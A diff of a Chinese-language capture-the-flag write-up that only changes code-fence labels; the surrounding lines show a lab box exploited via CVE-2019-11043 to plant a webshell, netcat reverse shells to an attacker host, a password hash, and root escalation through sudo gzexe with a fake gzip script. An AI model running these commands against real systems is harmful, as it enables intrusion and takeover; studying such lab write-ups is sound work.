@@ -71,7 +71,7 @@ CVE-2019-11043
 
 采用 [neex/phuip-fpizdam: Exploit for CVE-2019-11043](https://github.com/neex/phuip-fpizdam)
 
-```shell
+```bash
 randark@developer:~/code/VNCTF-OnlyLocalSql$ docker run --rm ypereirareis/cve-2019-11043 http://192.168.56.113/index.php
 2024/02/18 05:51:03 Base status code is 200
 2024/02/18 05:51:05 Status code 502 for qsl=1765, adding as a candidate
@@ -87,14 +87,14 @@ randark@developer:~/code/VNCTF-OnlyLocalSql$ docker run --rm ypereirareis/cve-20
 
 可以看到 webshell 被成功植入，尝试利用
 
-```shell
+```bash
 randark@developer:~/code/VNCTF-OnlyLocalSql$ curl http://192.168.56.113/index.php?a=/bin/bash+-c+whoami
 www-data
 ```
 
 ## User - www-data
 
-```shell
+```bash
 # http://192.168.56.113/index.php?a=/bin/sh+-c+%27id;nc%20-c%20bash%20192.168.56.102%209999%27&\
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 9999
@@ -144,7 +144,7 @@ emma:5f4dcc3b5aa765d61d8327deb882cf80
 
 ## User - emma
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs emma@192.168.56.113
 [14:54:09] Welcome to pwncat 🐈!
@@ -158,7 +158,7 @@ emma
 
 ### flag - user
 
-```shell
+```bash
 (remote) emma@emma:/home/emma$ cat user.txt
 youdontknowme
 ```
@@ -214,7 +214,7 @@ void main(){
 
 ## User - root
 
-```shell
+```bash
 emma@emma:~$ sudo -u root /usr/bin/gzexe /bin/id
 emma@emma:~$ cd /tmp
 emma@emma:/tmp$ echo "nc -e /bin/bash 192.168.56.102 7777" > gzip
